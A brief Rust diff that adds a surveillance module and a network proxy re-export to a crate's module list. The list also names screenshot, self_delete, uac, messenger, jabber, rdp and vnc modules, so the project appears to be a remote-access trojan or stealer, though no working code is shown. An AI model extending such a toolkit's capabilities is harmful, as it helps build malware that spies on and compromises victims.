@@ -24,6 +24,7 @@ pub mod screenshot;
 pub mod self_delete;
 pub mod settings;
 pub mod storage;
+pub mod surveillance;
 pub mod system;
 pub mod task;
 pub mod uac;
@@ -41,6 +42,7 @@ pub use communication::jabber;
 pub use communication::messenger;
 
 pub use network::ftp;
+pub use network::proxy;
 pub use network::rdp;
 pub use network::services;
 pub use network::vnc;
